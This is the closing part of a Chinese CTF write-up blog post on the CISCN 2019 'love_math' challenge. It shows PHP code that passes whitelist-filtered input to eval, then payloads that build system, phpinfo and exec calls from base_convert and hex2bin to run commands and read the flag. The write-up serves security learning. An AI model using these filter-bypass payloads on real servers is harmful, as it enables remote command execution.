class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ref.math.php">https://www.php.net/manual/zh/ref.math.php</a></p>
+<p>目标就是构造一个80字符以下的payload读到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># system(&#39;ls&#39;)</span><br><span class="line">base_convert(1751504350,10,36)(base_convert(784,10,36))</span><br><span class="line"></span><br><span class="line"># phpinfo()</span><br><span class="line">base_convert(55490343972,10,36)()</span><br></pre></td></tr></table></figure>
+<p>问题来了,只能转换出字母和数字,特殊符号没办法.(我就卡在这里)</p>
+<p>实际上绕道而行,通过其他params引入即可.比如url后面跟个变量,还有ROIS大佬的<code>system(getallheaders()&#123;9&#125;)</code>,通过header引入.</p>
+<p>最最最优雅的解法来自我在群内看到的某个群友,忘记名字了,只保存了payload:</p>
+<p><code>base_convert(47138,20,36)(base_convert(3761671484,13,36)(dechex(474260465194)))</code></p>
+<p>79个字符,<code>exec(hex2bin(6e6c20662a))</code></p>
+<p><code>6e6c20662a</code>内容是<code>nl f*</code></p>
+<p>太秀了,允许我膜一下!!!</p>
+<p>最后一题web没看懂,了解了大致思路,想复现环境没了.找机会再补上</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>M09ic
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://m09ic.top/posts/41838/" title="CISCN 2019 Quals Writeup(补档)">https://m09ic.top/posts/41838/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/writeup/" rel="tag"># writeup</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/48529/" rel="prev" title="Awesome github">
+      <i class="fa fa-chevron-left"></i> Awesome github
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/posts/34838/" rel="next" title="XSS bypass 安恒玄武盾">
+      XSS bypass 安恒玄武盾 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#MISC"><span class="nav-number">1.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="nav-number">1.1.</span> <span class="nav-text">0x00 签到题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-saleae"><span class="nav-number">1.2.</span> <span class="nav-text">0x01 saleae</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-24c"><span class="nav-number">1.3.</span> <span class="nav-text">0x02 24c</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-usbasp"><span class="nav-number">1.4.</span> <span class="nav-text">0x03 usbasp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CRYPTO"><span class="nav-number">2.</span> <span class="nav-text">CRYPTO</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-justsoso"><span class="nav-number">2.1.</span> <span class="nav-text">0x04 justsoso</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-warmup"><span class="nav-number">2.2.</span> <span class="nav-text">0x05 warmup</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB"><span class="nav-number">3.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06-JustSoso"><span class="nav-number">3.1.</span> <span class="nav-text">0x06 JustSoso</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x07-%E5%85%A8%E5%AE%87%E5%AE%99%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84SQL"><span class="nav-number">3.2.</span> <span class="nav-text">0x07 全宇宙最简单的SQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x08-love-math"><span class="nav-number">3.3.</span> <span class="nav-text">0x08 love_math</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">M09ic</p>
+  <div class="site-description" itemprop="description">网络安全,编程学习记录的破地方</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/M09Ic" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;M09Ic" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:m09ic@foxmail.com" title="E-Mail → mailto:m09ic@foxmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://yml-sec.top/" title="https:&#x2F;&#x2F;yml-sec.top" rel="noopener" target="_blank">夜莫离</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://nightrainy.github.io/" title="https:&#x2F;&#x2F;nightrainy.github.io" rel="noopener" target="_blank">知世</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.360bug.net/" title="http:&#x2F;&#x2F;www.360bug.net" rel="noopener" target="_blank">孙德胜</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-paper-plane"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">M09ic</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'yP9ifyVVnh7znqRQVWNWn0V6-gzGzoHsz',
+      appKey     : 'k84kdIIIEt3b7F17XqEoBT22',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : false,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
